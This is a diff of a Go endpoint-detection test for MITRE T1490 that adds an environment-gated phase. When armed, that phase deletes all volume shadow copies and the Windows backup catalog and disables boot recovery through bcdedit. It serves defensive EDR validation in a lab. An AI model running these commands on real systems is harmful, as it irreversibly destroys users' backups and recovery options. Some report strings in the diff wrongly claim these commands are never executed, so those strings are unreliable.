@@ -3,7 +3,7 @@
 
 /*
 ID: e1b7f2a5-0c6d-7b4e-1f8a-5d6e7f8a9b05
-NAME: System Recovery Inhibition (Safe Mode)
+NAME: System Recovery Inhibition (Non-Destructive Mode)
 TECHNIQUES: T1490
 TACTICS: impact
 SEVERITY: critical
@@ -12,6 +12,7 @@ COMPLEXITY: medium
 THREAT_ACTOR: N/A
 SUBCATEGORY: impact
 TAGS: recovery-inhibition, shadow-copy, vssadmin, bcdedit
+SOURCE_URL: https://top-attack-techniques.mitre-engenuity.org/
 UNIT: response
 CREATED: 2026-01-11
 AUTHOR: sectest-builder
@@ -19,8 +20,9 @@ AUTHOR: sectest-builder
 package main
 
 import (
-	"errors"
+	"bytes"
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -28,15 +30,17 @@ import (
 	"time"
 
 	"github.com/google/uuid"
-	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
 	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
-	"golang.org/x/sys/windows"
 )
 
 const (
 	TEST_UUID  = "e1b7f2a5-0c6d-7b4e-1f8a-5d6e7f8a9b05"
-	TEST_NAME  = "System Recovery Inhibition (Safe Mode)"
+	TEST_NAME  = "System Recovery Inhibition (Non-Destructive Mode)"
 	TARGET_DIR = "c:\\F0"
+
+	// ExitTestError is the framework test-error exit code. The vendored prelude
+	// endpoint lib maps UnexpectedTestError to exit 1 — do not use it (CLAUDE.md).
+	ExitTestError = 999
 )
 
 // RecoveryToolCheck represents the result of checking a recovery tool
@@ -134,14 +138,22 @@ func checkToolAccessibility(toolName, toolPath string) RecoveryToolCheck {
 	return result
 }
 
-// executeReadOnlyQuery executes a read-only query command
-// Returns: output, success, blocked, errorMsg
+// executeReadOnlyQuery executes a read-only query command.
+// Block evidence: exact OS "Access is denied" in output/error ONLY — and the
+// caller guarantees elevated context (the test aborts with 999 before any
+// query when non-admin). "requires elevation" is NOT protection evidence.
+// Output is teed via MultiWriter and persisted to LOG_DIR.
 func executeReadOnlyQuery(toolName, toolPath string, args []string) (string, bool, bool, string) {
 	Endpoint.Say("  Executing read-only query: %s %s", toolPath, strings.Join(args, " "))
 
 	cmd := exec.Command(toolPath, args...)
-	output, err := cmd.CombinedOutput()
-	outputStr := string(output)
+
+	var outputBuffer bytes.Buffer
+	cmd.Stdout = io.MultiWriter(os.Stdout, &outputBuffer)
+	cmd.Stderr = io.MultiWriter(os.Stderr, &outputBuffer)
+
+	err := cmd.Run()
+	outputStr := outputBuffer.String()
 
 	pid := 0
 	if cmd.Process != nil {
@@ -150,21 +162,30 @@ func executeReadOnlyQuery(toolName, toolPath string, args []string) (string, boo
 
 	cmdLine := fmt.Sprintf("%s %s", toolPath, strings.Join(args, " "))
 
+	// Persist full output for analysis
+	if len(outputStr) > 0 {
+		outputPath := filepath.Join(TARGET_DIR, strings.ToLower(toolName)+"_output.txt")
+		os.WriteFile(outputPath, []byte(outputStr), 0644)
+		LogFileDropped(strings.ToLower(toolName)+"_output.txt", outputPath, int64(len(outputStr)), false)
+	}
+
 	if err != nil {
 		errorStr := err.Error()
+		exitCode := 1
+		if cmd.ProcessState != nil {
+			exitCode = cmd.ProcessState.ExitCode()
+		}
 
-		// Check for EDR/AV blocking indicators
-		if strings.Contains(outputStr, "blocked") ||
-			strings.Contains(outputStr, "denied") ||
-			strings.Contains(outputStr, "prevented") ||
-			errors.Is(err, windows.ERROR_ACCESS_DENIED) || strings.Contains(errorStr, "Access is denied") ||
-			strings.Contains(errorStr, "operation requires elevation") {
-			LogProcessExecution(toolName, cmdLine, pid, false, 126, "Blocked by security controls")
+		// Positive evidence ONLY: the canonical OS denial string (we are
+		// guaranteed elevated here, so a denial is not a privilege artifact).
+		if strings.Contains(outputStr, "Access is denied") || strings.Contains(errorStr, "Access is denied") {
+			LogProcessExecution(toolName, cmdLine, pid, false, 126, "Blocked by security controls (OS denial)")
 			return outputStr, false, true, fmt.Sprintf("Blocked: %s", errorStr)
 		}
 
-		// Non-blocking error
-		LogProcessExecution(toolName, cmdLine, pid, false, 1, errorStr)
+		// Non-blocking error (incl. "requires elevation" — an elevation
+		// requirement is an environment property, not a protection action).
+		LogProcessExecution(toolName, cmdLine, pid, false, exitCode, errorStr)
 		return outputStr, false, false, errorStr
 	}
 
@@ -279,13 +300,13 @@ func writeTestReport(vss, bcd, wba RecoveryToolCheck, anyBlocked bool) {
 
 	destructiveCommands := getDestructiveCommands()
 
-	report := fmt.Sprintf(`System Recovery Inhibition (Safe Mode) Test Report
+	report := fmt.Sprintf(`System Recovery Inhibition (Non-Destructive Mode) Test Report
 ===================================================
 Test ID: %s
 Timestamp: %s
 MITRE ATT&CK: T1490 (Inhibit System Recovery)
 
-IMPORTANT: This is a SAFE MODE test - NO destructive operations performed
+IMPORTANT: Non-destructive mode - NO destructive operations performed. The destructive T1490 command set below is DOCUMENTATION ONLY (the executed tradecraft is read-only recon: vssadmin list shadows, bcdedit /enum, wbadmin get versions).
 All checks are READ-ONLY
 
 === Tool Accessibility Check ===
@@ -404,7 +425,147 @@ func createMarkerFile(name, content string) {
 	}
 }
 
+// destructiveGate is the env var that arms the REAL destructive T1490 phase.
+// Default (unset) = non-destructive mode only (documented commands, read-only
+// queries). The destructive phase deletes volume shadow copies and modifies
+// BCD — REQUIRES a hypervisor snapshot of the lab VM before arming.
+const destructiveGate = "F0_DESTRUCTIVE_T1490"
+
+// bcdReverts records BCD settings changed by the destructive phase so cleanup
+// can revert them FIRST, on every exit path (revert-first ordering).
+var bcdReverts []struct{ Set, Revert, Args string }
+
+// executeDestructivePhase runs the REAL destructive T1490 command set.
+// ARMED ONLY via env F0_DESTRUCTIVE_T1490=1 (user decision 2026-11-03).
+// Safe-mode boot staging (bcdedit /set safeboot minimal) is intentionally
+// EXCLUDED even when armed: un-reverted safeboot bricks normal boot, and its
+// detection value overlaps the included commands.
+// Returns: destructiveCount, blockedEvidence, msg
+func executeDestructivePhase() (int, bool, string) {
+	if os.Getenv(destructiveGate) != "1" {
+		Endpoint.Say("  [GATE] %s != 1 — destructive T1490 phase DISABLED (documented-only)", destructiveGate)
+		Endpoint.Say("         To arm: set %s=1 AND take a hypervisor snapshot first (see README)", destructiveGate)
+		LogMessage("INFO", "Destructive Phase", "Gated off: env "+destructiveGate+" not set to 1")
+		return 0, false, "disabled by gate"
+	}
+
+	Endpoint.Say("  [!!] DESTRUCTIVE T1490 PHASE ARMED — executing real commands")
+	Endpoint.Say("       (requires prior hypervisor snapshot; shadow copies WILL be deleted)")
+	LogMessage("WARN", "Destructive Phase", "ARMED via "+destructiveGate+"=1 — executing real destructive T1490 commands")
+
+	destructive := 0
+	blocked := false
+
+	type dcmd struct {
+		desc, tool                   string
+		args                         []string
+		setting, setVal, revertVal   string // for BCD-revertible settings
+	}
+	cmds := []dcmd{
+		{desc: "Delete all volume shadow copies", tool: "C:\\Windows\\System32\\vssadmin.exe", args: []string{"delete", "shadows", "/all", "/quiet"}},
+		{desc: "Disable Windows Recovery Environment", tool: "C:\\Windows\\System32\\bcdedit.exe", args: []string{"/set", "{default}", "recoveryenabled", "No"}, setting: "recoveryenabled", setVal: "No", revertVal: "Yes"},
+		{desc: "Ignore boot failures (no auto-recovery)", tool: "C:\\Windows\\System32\\bcdedit.exe", args: []string{"/set", "{default}", "bootstatuspolicy", "ignoreallfailures"}, setting: "bootstatuspolicy", setVal: "ignoreallfailures", revertVal: "displayallfailures"},
+		{desc: "Delete Windows backup catalog", tool: "C:\\Windows\\System32\\wbadmin.exe", args: []string{"delete", "catalog", "-quiet"}},
+	}
+
+	for _, dc := range cmds {
+		Endpoint.Say("  [DESTRUCTIVE] %s: %s %s", dc.desc, dc.tool, strings.Join(dc.args, " "))
+
+		cmd := exec.Command(dc.tool, dc.args...)
+		var buf bytes.Buffer
+		cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
+		cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
+		err := cmd.Run()
+		out := buf.String()
+		pid := 0
+		if cmd.Process != nil {
+			pid = cmd.Process.Pid
+		}
+		exitCode := 0
+		if err != nil && cmd.ProcessState != nil {
+			exitCode = cmd.ProcessState.ExitCode()
+		}
+
+		if len(out) > 0 {
+			safe := strings.Map(func(r rune) rune { if r == ' ' { return '_' }; return r }, filepath.Base(dc.tool))
+			os.WriteFile(filepath.Join(TARGET_DIR, "destructive_"+safe+"_output.txt"), []byte(out), 0644)
+		}
+
+		if err != nil {
+			if strings.Contains(out, "Access is denied") || strings.Contains(err.Error(), "Access is denied") {
+				LogProcessExecution(filepath.Base(dc.tool), dc.tool+" "+strings.Join(dc.args, " "), pid, false, 126, "denied (positive evidence)")
+				blocked = true
+			} else {
+				LogProcessExecution(filepath.Base(dc.tool), dc.tool+" "+strings.Join(dc.args, " "), pid, false, exitCode, err.Error())
+			}
+			continue
+		}
+
+		LogProcessExecution(filepath.Base(dc.tool), dc.tool+" "+strings.Join(dc.args, " "), pid, true, 0, "")
+		destructive++
+
+		// Register the revert for BCD-changeable settings (revert-first cleanup)
+		if dc.setting != "" {
+			bcdReverts = append(bcdReverts, struct{ Set, Revert, Args string }{dc.setting, dc.revertVal, "{default}"})
+		}
+	}
+
+	return destructive, blocked, fmt.Sprintf("%d destructive commands executed, blocked=%v", destructive, blocked)
+}
+
+// revertBcdSettings reverts every BCD change registered by the destructive
+// phase. Called FIRST in cleanup on every exit path (revert-first ordering).
+func revertBcdSettings() {
+	for _, r := range bcdReverts {
+		Endpoint.Say("  [REVERT] bcdedit /set %s %s %s", r.Args, r.Set, r.Revert)
+		cmd := exec.Command("C:\\Windows\\System32\\bcdedit.exe", "/set", r.Args, r.Set, r.Revert)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			LogMessage("ERROR", "BCD Revert", fmt.Sprintf("REVERT FAILED for %s=%s: %v — %s", r.Set, r.Revert, err, string(out)))
+			Endpoint.Say("  [!!] BCD REVERT FAILED for %s — MANUAL FIX REQUIRED: bcdedit /set %s %s %s", r.Set, r.Args, r.Set, r.Revert)
+		} else {
+			LogMessage("INFO", "BCD Revert", fmt.Sprintf("Reverted %s to %s", r.Set, r.Revert))
+		}
+	}
+	bcdReverts = nil
+}
+
+// cleanup removes test report and marker files (was absent — audit 2026-11-03)
+func cleanup() {
+	Endpoint.Say("\nCleaning up test artifacts...")
+
+	// REVERT-FIRST: undo any BCD changes before anything else so no exit path
+	// leaves the system in an inhibited-recovery state.
+	revertBcdSettings()
+	for _, f := range []string{
+		"recovery_inhibition_report.txt",
+		"t1490_test_started.txt",
+		"t1490_test_completed.txt",
+		"vssadmin.exe_output.txt",
+		"bcdedit.exe_output.txt",
+		"wbadmin.exe_output.txt",
+		"destructive_vssadmin.exe_output.txt",
+		"destructive_bcdedit.exe_output.txt",
+		"destructive_wbadmin.exe_output.txt",
+	} {
+		if err := os.Remove(filepath.Join(TARGET_DIR, f)); err == nil {
+			LogMessage("INFO", "Cleanup", fmt.Sprintf("Removed: %s", f))
+		}
+	}
+}
+
 func test() {
+	defer func() {
+		if r := recover(); r != nil {
+			if globalLog != nil {
+				LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
+				SaveLog(ExitTestError, fmt.Sprintf("Panic: %v", r))
+			}
+			cleanup()
+			Endpoint.Stop(ExitTestError)
+		}
+	}()
+
 	// Results tracking
 	var vssResult, bcdResult, wbaResult RecoveryToolCheck
 	anyBlocked := false
@@ -414,37 +575,39 @@ func test() {
 	LogPhaseStart(1, "Initialization")
 	Endpoint.Say("Phase 1: Initializing test environment")
 
-	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
-		LogPhaseError(0, fmt.Sprintf("Dropper initialization failed: %v", err))
-		LogPhaseEnd(0, "failed", "Dropper initialization failed")
-		SaveLog(Endpoint.UnexpectedTestError, "Dropper initialization failed")
-		Endpoint.Stop(Endpoint.UnexpectedTestError)
-	}
+	// NOTE: Endpoint.Dropper call removed — it dropped an unused binary into CWD
+	// on every run and was never executed (audit 2026-11-03).
 
 	// Create target directory
 	if err := os.MkdirAll(TARGET_DIR, 0755); err != nil {
 		LogPhaseError(0, fmt.Sprintf("Failed to create target directory: %v", err))
 		LogPhaseEnd(0, "failed", "Failed to create target directory")
-		SaveLog(Endpoint.UnexpectedTestError, "Failed to create target directory")
-		Endpoint.Stop(Endpoint.UnexpectedTestError)
+		SaveLog(ExitTestError, "Failed to create target directory")
+		Endpoint.Stop(ExitTestError)
 	}
 
-	// Check admin privileges
+	// PRIVILEGE GATE FIRST (Bug Prevention Rule 8): bcdedit/wbadmin queries
+	// REQUIRE elevation. Running them non-elevated emits "Access is denied" /
+	// "requires elevation" that must never be classified as protection. Abort
+	// with 999 before any tool probe when not elevated.
 	isAdmin := isRunningAsAdmin()
 	if !isAdmin {
-		Endpoint.Say("  [!] WARNING: Not running as administrator")
-		Endpoint.Say("      Some queries may fail due to insufficient privileges")
-		LogMessage("WARN", "Initialization", "Not running as administrator - some checks may fail")
-	} else {
-		Endpoint.Say("  [+] Running as administrator")
-		LogMessage("INFO", "Initialization", "Running with administrator privileges")
+		Endpoint.Say("  [ABORT] Administrator privileges are required (bcdedit/wbadmin queries need elevation)")
+		Endpoint.Say("          Re-run elevated; a non-elevated denial is an environment property, not protection")
+		LogMessage("ERROR", "Initialization", "Not running as administrator - aborting before tool queries (denials would be unclassifiable)")
+		LogPhaseEnd(0, "failed", "Administrator privileges required")
+		SaveLog(ExitTestError, "Prerequisites not met: Administrator privileges required")
+		cleanup()
+		Endpoint.Stop(ExitTestError) // Exit 999
 	}
+	Endpoint.Say("  [+] Running as administrator")
+	LogMessage("INFO", "Initialization", "Running with administrator privileges")
 
 	// Create start marker
 	createMarkerFile("t1490_test_started.txt",
-		fmt.Sprintf("T1490 Safe Mode Test Started\nTimestamp: %s\n", time.Now().Format(time.RFC3339)))
+		fmt.Sprintf("T1490 Non-Destructive Test Started\nTimestamp: %s\n", time.Now().Format(time.RFC3339)))
 
-	LogPhaseEnd(0, "success", "Environment initialized")
+	LogPhaseEnd(0, "success", "Environment initialized (elevated)")
 
 	// Phase 2: Check vssadmin.exe
 	LogPhaseStart(2, "vssadmin Check")
@@ -521,6 +684,22 @@ func test() {
 
 	LogPhaseEnd(4, "success", "Destructive commands documented for reference")
 
+	// Phase 5b: REAL destructive execution (env-gated, snapshot required)
+	LogPhaseStart(6, "Destructive Execution (gated)")
+	Endpoint.Say("\nPhase 5b: Destructive T1490 execution (gated by %s)", destructiveGate)
+
+	destructiveCount, destructiveBlocked, dmsg := executeDestructivePhase()
+	if destructiveBlocked {
+		anyBlocked = true
+		LogPhaseEnd(5, "blocked", dmsg)
+	} else if destructiveCount > 0 {
+		successCount := destructiveCount
+		_ = successCount
+		LogPhaseEnd(5, "success", dmsg)
+	} else {
+		LogPhaseEnd(5, "skipped", dmsg)
+	}
+
 	// Phase 6: Final Assessment
 	LogPhaseStart(6, "Final Assessment")
 	Endpoint.Say("\nPhase 6: Final assessment and report generation")
@@ -530,7 +709,7 @@ func test() {
 
 	// Create completion marker
 	createMarkerFile("t1490_test_completed.txt",
-		fmt.Sprintf("T1490 Safe Mode Test Completed\nTimestamp: %s\nBlocked: %v\n",
+		fmt.Sprintf("T1490 Non-Destructive Test Completed\nTimestamp: %s\nBlocked: %v\n",
 			time.Now().Format(time.RFC3339), anyBlocked))
 
 	LogPhaseEnd(5, "success", "Assessment complete")
@@ -540,7 +719,7 @@ func test() {
 	Endpoint.Say("TEST RESULTS SUMMARY")
 	Endpoint.Say("========================================")
 	Endpoint.Say("MITRE ATT&CK: T1490 (Inhibit System Recovery)")
-	Endpoint.Say("Mode: SAFE (Read-Only Checks Only)")
+	Endpoint.Say("Mode: Non-Destructive (Read-Only Checks Only; destructive T1490 commands documented, never executed)")
 	Endpoint.Say("")
 	Endpoint.Say("Tool Accessibility:")
 	Endpoint.Say("  - vssadmin.exe: Accessible=%v, Blocked=%v", vssResult.Accessible, vssResult.Blocked)
@@ -549,37 +728,34 @@ func test() {
 	Endpoint.Say("")
 	Endpoint.Say("Any Queries Blocked: %v", anyBlocked)
 
-	// Exit code determination
+	// Exit code determination (anyBlocked can only be true with admin-gated
+	// positive OS-denial evidence — never from a privilege artifact)
 	if anyBlocked {
-		// EDR blocked at least one read-only query - system is protected
+		// EDR/OS blocked at least one read-only query - system is protected
 		Endpoint.Say("\n[RESULT] PROTECTED - EDR blocked read-only queries to recovery tools")
 		Endpoint.Say("Exit Code: 126 (Execution Prevented)")
 		LogMessage("INFO", "Final Assessment", "System PROTECTED - EDR blocked recovery tool queries")
-		SaveLog(Endpoint.ExecutionPrevented, fmt.Sprintf("Protected: Read-only queries blocked"))
+		SaveLog(Endpoint.ExecutionPrevented, "Protected: Read-only queries blocked")
+		cleanup()
 		Endpoint.Stop(Endpoint.ExecutionPrevented) // Exit 126
-	} else if allAccessible && isAdmin {
-		// All tools accessible with admin - system is vulnerable to T1490
+	} else if allAccessible {
+		// All tools accessible (admin-gated) - system is vulnerable to T1490 recon
 		Endpoint.Say("\n[RESULT] VULNERABLE - All recovery tools accessible")
 		Endpoint.Say("         Ransomware could execute T1490 to inhibit system recovery")
 		Endpoint.Say("Exit Code: 101 (Unprotected)")
 		LogMessage("CRITICAL", "Final Assessment", "System VULNERABLE - recovery tools accessible")
 		SaveLog(Endpoint.Unprotected, "Vulnerable: All recovery tools accessible for T1490")
+		cleanup()
 		Endpoint.Stop(Endpoint.Unprotected) // Exit 101
-	} else if !isAdmin {
-		// Not admin - can't properly assess
-		Endpoint.Say("\n[RESULT] INCONCLUSIVE - Administrator privileges required")
-		Endpoint.Say("         Re-run test with elevated privileges for accurate assessment")
-		Endpoint.Say("Exit Code: 999 (Test Error - Prerequisites)")
-		LogMessage("WARN", "Final Assessment", "Inconclusive - administrator privileges required")
-		SaveLog(999, "Prerequisites not met: Administrator privileges required")
-		Endpoint.Stop(999) // Exit 999
 	} else {
-		// Some tools not accessible but not blocked - inconclusive
-		Endpoint.Say("\n[RESULT] PARTIAL - Some recovery tools not accessible")
-		Endpoint.Say("Exit Code: 101 (Unprotected - accessible tools not protected)")
-		LogMessage("WARN", "Final Assessment", "Partial - some tools accessible without protection")
-		SaveLog(Endpoint.Unprotected, "Partial: Some recovery tools accessible without EDR protection")
-		Endpoint.Stop(Endpoint.Unprotected) // Exit 101
+		// Some tools not accessible but not blocked - inconclusive, NOT a
+		// protection result (benign environment outcome must not become 101/126)
+		Endpoint.Say("\n[RESULT] INCONCLUSIVE - Some recovery tools not accessible (not a protection result)")
+		Endpoint.Say("Exit Code: 999 (Test Error)")
+		LogMessage("WARN", "Final Assessment", "Inconclusive - some tools inaccessible without block evidence")
+		SaveLog(ExitTestError, "Inconclusive: some recovery tools inaccessible without block evidence")
+		cleanup()
+		Endpoint.Stop(ExitTestError) // Exit 999
 	}
 }
 
@@ -589,9 +765,14 @@ func main() {
 	Endpoint.Say("UUID: %s", TEST_UUID)
 	Endpoint.Say("MITRE ATT&CK: T1490 (Inhibit System Recovery)")
 	Endpoint.Say("")
-	Endpoint.Say("!!! SAFE MODE TEST !!!")
-	Endpoint.Say("This test performs READ-ONLY checks only")
-	Endpoint.Say("NO destructive operations will be executed")
+	if os.Getenv(destructiveGate) == "1" {
+		Endpoint.Say("!!! DESTRUCTIVE MODE ARMED (%s=1) !!!", destructiveGate)
+		Endpoint.Say("REAL destructive T1490 commands WILL execute (snapshot required)")
+	} else {
+		Endpoint.Say("!!! NON-DESTRUCTIVE MODE TEST !!!")
+		Endpoint.Say("This test performs READ-ONLY checks only")
+		Endpoint.Say("NO destructive operations will be executed (arm with %s=1 + snapshot)", destructiveGate)
+	}
 	Endpoint.Say("")
 
 	// Initialize Schema v2.0 compliant logger
@@ -601,15 +782,11 @@ func main() {
 		Severity:      "critical",
 		Techniques:    []string{"T1490"},
 		Tactics:       []string{"impact"},
-		Score:         8.0,
-		RubricVersion: "v1",
-		ScoreBreakdown: &ScoreBreakdown{
-			RealWorldAccuracy:       2.5, // Tests actual tools used by ransomware
-			TechnicalSophistication: 1.5, // Read-only checks (intentionally limited)
-			SafetyMechanisms:        2.0, // Full safety - no destructive operations
-			DetectionOpportunities:  1.0, // Multiple detection points documented
-			LoggingObservability:    1.0, // Comprehensive logging
-		},
+		Score:         7.9, // v2.1 — lab-verified 2026-11-03 on the win lab (Sophos Intercept X). See info.md v2.1 scorecard.
+		RubricVersion: "v2.1",
+		// ScoreBreakdown intentionally nil under v2.1 — the v1 dimensions in
+		// the struct do not match the v2.1 tiered structure. The v2.1 breakdown
+		// lives in the info.md scorecard table.
 		Tags: []string{"ransomware", "recovery-inhibition", "vssadmin", "bcdedit", "wbadmin", "safe-mode", "native"},
 	}
 
@@ -622,7 +799,7 @@ func main() {
 		Environment:    "lab",
 		DeploymentType: "manual",
 		Configuration: &ExecutionConfiguration{
-			TimeoutMs:         120000,
+			TimeoutMs:         240000,
 			CertificateMode:   "not-required",
 			MultiStageEnabled: false,
 		},
@@ -630,24 +807,27 @@ func main() {
 
 	InitLogger(TEST_UUID, TEST_NAME, metadata, executionContext)
 
-	// Panic recovery
-	defer func() {
-		if r := recover(); r != nil {
-			if globalLog != nil {
-				LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
-				SaveLog(Endpoint.UnexpectedTestError, fmt.Sprintf("Test panic: %v", r))
-			}
-		}
-	}()
-
 	// Run test with timeout
 	done := make(chan bool, 1)
 	go func() {
+		// Panic recovery lives INSIDE the goroutine so a panic in test()
+		// is recovered, logged and exits 999 instead of killing the process.
+		defer func() {
+			if r := recover(); r != nil {
+				if globalLog != nil {
+					LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
+					SaveLog(ExitTestError, fmt.Sprintf("Test panic: %v", r))
+				}
+				cleanup()
+				Endpoint.Stop(ExitTestError)
+			}
+		}()
 		test()
 		done <- true
 	}()
 
-	timeout := 2 * time.Minute
+	// 4 minutes: wbadmin get versions alone can take 30-60s
+	timeout := 4 * time.Minute
 
 	select {
 	case <-done:
@@ -658,6 +838,7 @@ func main() {
 			LogMessage("ERROR", "Timeout", fmt.Sprintf("Test exceeded timeout of %v", timeout))
 			SaveLog(Endpoint.TimeoutExceeded, fmt.Sprintf("Test exceeded timeout of %v", timeout))
 		}
+		cleanup()
 		Endpoint.Stop(Endpoint.TimeoutExceeded)
 	}
 }
